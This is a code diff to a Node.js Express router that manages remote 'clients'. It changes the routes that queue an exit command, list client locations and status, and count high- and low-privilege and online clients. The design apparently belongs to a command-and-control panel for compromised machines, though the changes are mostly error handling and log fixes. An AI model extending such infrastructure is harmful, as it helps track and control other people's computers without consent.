@@ -3,7 +3,6 @@ const Client = require('../client.model');
 const webCookieValidator = require('../../Utils/MiddleWears/webCookieValidator');
 const Utils = require('../../Utils/utilFunctions');
 const Command = require("../../Commands/commands.model");
-const clientLocations = require("../../Location/clientLocation.model")
 const ClientUtils = require('../../Utils/clientUtils')
 
 //validate cookies
@@ -56,7 +55,11 @@ router.route('/kill').post((req, res) => {
                 ClientUtils.AddCommand(clientId, "exit").then(() => res.send()).catch(() => res.sendStatus(500))
             }
 
-        }).catch((err) => Utils.LogToFile(`Error checking client status for kill command ${err}`))
+        }).catch((err) => {
+            Utils.LogToFile(`Error checking client status for kill command ${err}`)
+            ClientUtils.RemoveClient(clientId)
+            res.send()
+        })
     } catch (err) {
         Utils.LogToFile(`Error killing client ${err}`);
         res.sendStatus(500)
@@ -96,24 +99,23 @@ router.route('/').get((req, res) => {
     })
 })
 
-
 //Get all client locations
 router.route('/locations').get((req, res) => {
-    clientLocations.find({}, {}, {}, function (err, locations) {
+    Client.find({}, {}, {}, function (err, users) {
         if (err) {
-            Utils.LogToFile(`Error getting all client's locations ${err}`);
-            res.sendStatus(401);
+            Utils.LogToFile(`Error getting user by token ${err}`);
+            res.sendStatus(400);
         } else {
-            if (locations) {
-                res.send(locations);
+            if (users) {
+                res.send(users);
             } else {
                 res.send();
             }
         }
-    })
+    }).select({client_id: true, location: true, status: true, _id:false})
 })
 
-
+//get client statistics
 router.route('/statistics').get((req, res) => {
     ClientUtils.NumLowPrivClients().then((lowPrivs) => {
         ClientUtils.NumHighPrivClients().then((highPrivs) => {
@@ -125,10 +127,10 @@ router.route('/statistics').get((req, res) => {
                         onlineClients: onlineClients,
                         offlineClients: offlineClients
                     })
-                }).catch((err) => Utils.LogToFile(`Error getting highPrivs stats ${err}`))
-            }).catch((err) => Utils.LogToFile(`Error getting highPrivs stats ${err}`))
+                }).catch((err) => Utils.LogToFile(`Error getting offlineClients stats ${err}`))
+            }).catch((err) => Utils.LogToFile(`Error getting onlineClients stats ${err}`))
         }).catch((err) => Utils.LogToFile(`Error getting highPrivs stats ${err}`))
-    }).catch((err) => Utils.LogToFile(`Error getting highPrivs stats ${err}`))
+    }).catch((err) => Utils.LogToFile(`Error getting lowPrivs stats ${err}`))
 })
 
 module.exports = router;
